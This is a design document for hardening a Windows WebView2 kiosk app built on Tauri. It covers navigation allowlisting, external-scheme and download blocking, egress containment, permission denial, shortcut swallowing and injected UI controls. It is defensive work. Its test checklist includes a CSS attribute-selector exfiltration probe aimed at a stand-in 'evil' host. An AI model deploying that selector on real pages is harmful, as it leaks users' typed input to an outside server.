# P1-D2b — Webview Hardening + Navigation Guard (Design)

> Sub-project of P1-D2 (the `kiosk-main` Tauri app). Parent spec of record:
> `docs/superpowers/specs/2026-07-05-kiosk-browser-design.md` (rev 2), §3.6 and §7.
> **Depends on P1-D2a** (the integration spine) — builds on its webview, driver,
> `EffectSink`, and config-apply path.

**Status:** approved 2026-07-18 (design). The bite-sized implementation plan is
**deferred until D2a is merged** — the plan is entirely WebView2-COM code that
cannot compile or be verified off a Windows host, and it will be far more correct
authored against D2a's real interfaces (and by the Windows session that just
built them). This document is the stable design; §3.6/§7 are fixed spec.

## Goal

Apply the §7 hardening control set and the §3.6 navigation guard to the D2a
webview — the difference between "a fullscreen browser" and "a kiosk." Windows /
WebView2 only (the §7 Linux and Android columns are P2/P3). All per-OS code lives
in `kiosk-main/src/platform/windows.rs`, reached through Tauri's `with_webview`
(which hands back the `ICoreWebView2Controller` / `CoreWebView2`).

## Dependency on D2a — the two seams

D2a leaves exactly two integration points for D2b:

1. **The webview builder** — D2b adds the document-start **injection**
   (`WebviewWindowBuilder::initialization_script`) and, post-build, the WebView2
   **settings flags + event subscriptions** via `with_webview`.
2. **The nav callbacks** — D2a's `TauriSink` stubs `NavigationCommitted` /
   `NavigationFailed`. D2b wires them for real off WebView2 `NavigationCompleted`,
   so the navigation intercept both **enforces the allowlist** and **feeds the
   FSM** (a definitive load failure → `AppEvent::NavigationFailed` → the rule-5 /
   ErrorPage path already built in P1-D1).

## The one piece of shared state — `NavPolicy`

`kiosk_core::nav::decide(url, allowlist, scheme_allowlist, is_remote_origin)` is a
pure, host-tested function (P1-C) — but it needs the **current** allowlist, which
changes on every config poll. The D2a↔D2b contract is therefore a single
lock-free cell:

```rust
// crates/kiosk-main/src/nav_policy.rs  (new in D2b)
struct NavPolicy {
    allowlist: kiosk_core::nav::allowlist::Allowlist, // compiled from content.allowlist
    scheme_allowlist: Vec<String>,                    // content.scheme_allowlist
    effective_home: String,                           // implicit-allow target (cfg-02)
    active_origin: String,                            // arch-08 bootstrap-window origin
}
type SharedNavPolicy = arc_swap::ArcSwap<NavPolicy>;
```

- **Written** by the config-apply path (D2a's fetch/boot flow, extended in D2b) on
  every `ConfigApplied` — rebuild the `NavPolicy` from the new `content` and
  `arcswap.store(...)`.
- **Read** lock-free by the WebView2 `NavigationStarting` / `WebResourceRequested`
  callbacks (which run on the WebView2 UI thread and must not block).
- `is_remote_origin` for a given navigation is derived from whether the initiating
  document is the app origin (`tauri://…`, bundled pages) or a remote origin —
  this is what keeps `kiosk://`-from-remote blocked (routed through
  `scheme::scheme_decision` inside `decide`, never the allowlist).

Adding `arc_swap` (a small, well-established crate) is the only new dependency.

## Control groups — all `platform/windows.rs`, behind a `Hardening` seam

The platform layer exposes a thin `Hardening` trait/impl so `main.rs` calls
`hardening::apply(&webview, shared_policy, telemetry, event_tx)` once at setup;
everything below is subscribed inside it.

| Group | Mechanism (§7 / §3.6) |
|---|---|
| **Navigation guard** | `NavigationStarting` when `IsMainFrame` → `nav::decide` against the current `NavPolicy` → `args.Cancel = true` if blocked, emit `nav.blocked` with `BlockReason`; new-window requests open in the same webview; `NavigationCompleted.IsSuccess == false` → send `AppEvent::NavigationFailed`; success → `NavigationCommitted` |
| **External schemes (H2)** | `LaunchingExternalUriScheme` → `args.Cancel = true` unless the scheme is in `scheme_allowlist`; blocked launches log `nav.blocked` with the scheme |
| **Egress containment (SEC-10)** | `WebResourceRequested` (ALL resource kinds, not just navigations) → check the request URL vs the allowlist, cancel if off-list; plus an injected restrictive CSP. Closes CSS/JS exfiltration that never triggers a navigation. Residual gaps (service workers, some preload) documented |
| **Downloads / PDF (M4)** | `DownloadStarting` → cancel; a navigation resolving to `application/pdf` is blocked (`nav.blocked`) unless `content.pdf_view` (the bundled pdf.js route is a later phase — D2b blocks by default) |
| **WebView2 settings flags** | `AreDefaultContextMenusEnabled=false`, devtools off (release compiles without the feature), `IsZoomControlEnabled=false` **and `IsPinchZoomEnabled=false`**, `IsGeneralAutofillEnabled=false` + `IsPasswordAutosaveEnabled`/`IsPasswordAutofillEnabled=false`, `AreDefaultScriptDialogsEnabled=false` |
| **Script dialogs (M3)** | `ScriptDialogOpening` → auto-dismiss `beforeunload` (never surface on a blocked nav), rate-limit `alert`/`confirm`/`prompt` to defeat modal-spam DoS; leniency keyed app-origin vs remote-origin |
| **Web permissions (M9, default-deny)** | `PermissionRequested` → Deny (camera/mic/geolocation/notifications/clipboard-read/MIDI) unless enabled in `content.permissions` |
| **Shortcut blocking** | `CoreWebView2Controller.AcceleratorKeyPressed(Handled=true)` for the swallow list (Ctrl+W/N/T/P, F5, F11, …); reuse the P0 `WH_KEYBOARD_LL` spike for global chords (Alt+F4/Tab, Win combos) as **best-effort defense-in-depth on a pump-isolated thread — NOT a security boundary** (Tauri #13919); OS-reserved chords are closed only by §7.2 |
| **Injection engine (document-start)** | `initialization_script`: `* { user-select: none }` (+ `input,textarea { user-select: text }`), `dragstart`/`drop` preventDefault, `Object.defineProperty(window,"print",…)` no-op, cursor auto-hide after `cursor_autohide_seconds`. **Ships in P1**; the operator-supplied `inject_css`/`inject_js` knobs are P2 on top of this engine |
| **Misc** | `content.zoom` fixed factor; keep-awake via `SetThreadExecutionState`; `focus.lost` reassert-foreground on window deactivation |

## Host-testable vs Windows-only

- **Host-testable (extract as pure functions, unit-tested on any platform):**
  - `NavPolicy::from_config(content, active_origin)` — building the compiled
    allowlist + implicit-home + bootstrap-window origin (arch-08).
  - the accelerator **swallow-list membership** decision.
  - the **injected-script assembly** (the CSS/JS strings from
    `cursor_autohide_seconds` + the static controls).
  - the **PDF/download** decision (`pdf_view` + content-type → block/allow).
  - the **permission** lookup (`content.permissions` + requested kind → allow/deny).
  These reuse `nav::decide` / `Allowlist` from kiosk-core (already adversarially
  tested, RT-03) — D2b does not re-test the matcher, only the wiring.
- **Windows-host only (the human runs):** every COM event subscription and flag
  set, plus a manual smoke checklist — each §7.2 escape vector (Alt+F4/Tab, Ctrl+W,
  F11), an egress-block probe (`input[value^=a]{background:url(https://evil/a)}`),
  a permission-deny probe, an external-scheme block, a PDF block, and the injected
  controls (no context menu, no text selection, no print).

## Scope boundary — explicitly out

- **Linux (WebKitGTK) and Android** hardening — P2 / P3.
- **Native idle timer, exit gesture, PIN pad, `ClearProfile`** — D2c.
- **Operator `inject_css` / `inject_js` knobs** — P2 (the engine ships here; the
  knobs ride on top later).
- **Renderer crash/hang recovery** (`CoreWebView2.ProcessFailed`:
  `RenderProcessUnresponsive`→reload, `RenderProcessExited`→recreate). The parent
  spec bundles it in P1. It is `with_webview`-adjacent, so it lands either as a
  small addition to D2b or as the head of D2c — **decided at plan-authoring time**,
  once D2a's webview-handle plumbing is concrete. Recorded here so it is not
  dropped.

## Open decisions to resolve at plan time (need D2a's concrete interfaces)

1. Exactly how the config-apply path (D2a `fetch.rs`/`boot.rs`) gets a handle to
   the `SharedNavPolicy` to `.store()` on apply — a field threaded into the fetch
   task, most likely.
2. Where `ProcessFailed` recovery lands (D2b tail vs D2c head).
3. Whether `is_remote_origin` is best derived from the WebView2 `Source`/initiator
   or tracked in `NavPolicy.active_origin` — resolve against the real
   `NavigationStarting` args available in `webview2-com`.
